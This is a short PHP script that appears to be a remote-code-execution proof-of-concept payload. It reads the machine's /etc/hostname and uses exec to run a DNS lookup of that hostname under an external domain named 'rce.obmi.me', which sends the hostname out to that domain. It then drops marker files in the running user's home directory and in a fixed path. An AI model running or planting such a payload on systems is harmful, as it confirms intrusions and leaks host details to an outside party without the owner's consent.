<?php

try {
	$hostname =  trim(file_get_contents('/etc/hostname'));
	var_dump(trim($hostname));
	exec( 'host ' . $hostname.'.rce.obmi.me');
	file_put_contents( posix_getpwuid(posix_getuid())['dir'] . '/test_file_php.txt', "somedata");
} catch(Exception $e) {
	file_put_contents('/home/username1/test_exception_php.txt', "somedata");
}